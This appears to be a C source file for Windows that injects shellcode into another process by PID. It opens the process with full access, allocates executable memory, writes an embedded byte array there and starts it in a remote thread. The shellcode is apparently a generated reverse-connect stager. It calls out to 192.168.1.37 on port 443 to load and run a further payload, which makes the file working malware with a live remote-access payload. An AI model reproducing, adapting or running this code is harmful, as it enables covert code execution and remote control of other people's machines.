#include <windows.h>
#include <stdio.h>

const char *k = "[+]";
const char *i = "[*]";
const char *e = "[-]";

DWORD PID, TID = NULL;           // DWORD 32-bit unsigned integer for process id and thread id
HANDLE hProcess, hThread = NULL; // or INVALID_HANDLE_VALUE as the initilizer for the process handle and the thread handle

LPVOID rBuffer = NULL;

// generated shell code
unsigned char moh3aPuke[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x51\x48\x8b\x52\x18"
    "\x48\x8b\x52\x20\x56\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f"
    "\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
    "\x42\x3c\x48\x01\xd0\x41\x51\x66\x81\x78\x18\x0b\x02\x0f"
    "\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
    "\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x8b\x48\x18\x49"
    "\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
    "\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
    "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
    "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
    "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
    "\x5e\x59\x48\x01\xd0\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
    "\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
    "\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
    "\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
    "\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x01\x25\x41\x54"
    "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
    "\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
    "\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
    "\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
    "\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
    "\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
    "\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
    "\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
    "\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
    "\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
    "\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
    "\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
    "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
    "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
    "\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
    "\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
    "\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
    "\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
    "\x2a\x0a\x41\x89\xda\xff\xd5";

size_t moh3aPukeSize = sizeof(moh3aPuke);

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        printf("%s usage: program.exe <PID>\n", e);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("%s trying to open a handle to process (%ld)\n", i, PID);

    // open a handle to the process
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    HANDLE OpenProcess(
        [in] DWORD dwDesiredAccess,
        [in] BOOL  bInheritHandle,
        [in] DWORD dwProcessId
    );
    */
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL)
    {
        printf("%s couldn't get a handle to the process (%ld), error: %ld\n", e, PID, GetLastError());
        // for info about the system error code: https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes
        return EXIT_FAILURE;
    }
    printf("%s got a handle to the process!\n\\---0x%p\n", k, hProcess);

    // allocate bytes to process memory
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    LPVOID VirtualAllocEx(
        [in]           HANDLE hProcess,
        [in, optional] LPVOID lpAddress,
        [in]           SIZE_T dwSize,
        [in]           DWORD  flAllocationType,
        [in]           DWORD  flProtect
    );
    */
    rBuffer = VirtualAllocEx(hProcess, NULL, moh3aPukeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, moh3aPukeSize);

    // up until now the opened process is still alive
    // nothing is written to memory

    // actually write that allocated memory to the process memory
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten
    );
    */
    WriteProcessMemory(hProcess, rBuffer, moh3aPuke, moh3aPukeSize, NULL);
    printf("%s wrote %zu-bytes to process memory\n", k, moh3aPukeSize);

    // create thread to run our payload
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex
    HANDLE CreateRemoteThreadEx(
        [in]            HANDLE                       hProcess,
        [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
        [in]            SIZE_T                       dwStackSize,
        [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
        [in, optional]  LPVOID                       lpParameter,
        [in]            DWORD                        dwCreationFlags,
        [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        [out, optional] LPDWORD                      lpThreadId
    );
    */
    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer,
        NULL,
        0,
        0,
        &TID);

    if (hThread == NULL)
    {
        printf("%s couldn't get a handle to the thread, error: %ld\n", e, GetLastError());
        // for info about the system error code: https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes
        //
        /*
        https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
        BOOL CloseHandle(
          [in] HANDLE hObject
        );
        */
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the thread (%ld)!\n\\---0x%p", k, TID, hThread);

    // waits until the thread is in the signaled state or the time-out interval elapses
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
    DWORD WaitForSingleObject(
        [in] HANDLE hHandle,
        [in] DWORD  dwMilliseconds
    );
    */
    printf("%s waiting for thread to finish\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing\n", k);

    printf("%s cleaning up", i);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s done", i);

    return EXIT_SUCCESS;
}
